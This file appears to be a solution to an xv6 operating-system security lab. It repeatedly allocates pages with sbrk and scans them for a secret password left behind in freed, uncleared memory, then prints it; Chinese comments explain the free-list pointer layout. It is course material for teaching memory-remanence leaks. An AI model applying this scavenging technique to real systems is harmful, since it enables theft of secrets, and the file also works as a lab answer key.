#include "kernel/types.h"
#include "kernel/fcntl.h"
#include "user/user.h"
#include "kernel/riscv.h"

int
main(int argc, char *argv[])
{
  // your code here.  you should write the secret to fd 2 using write
  // (e.g., write(2, secret, 8)
  if(argc != 1){
    printf("Usage: attack error\n");
    exit(1);
  }
  while(1) {
    char *end = sbrk(PGSIZE); // 每次分配一个页
    // memcmp会逐个字节地进行比较
    // 在将页面存入空闲链表后，该页的前 8 个字节存放的是 next 指针，存放下一个空闲页。因此会覆盖原有页中的前 8 个字节
    if (memcmp(end + 8, "very very secret pw is:   ", 24) == 0) {
      write(2, end+32, 8);
      exit(0);
    }
  }
  
  exit(1);
}
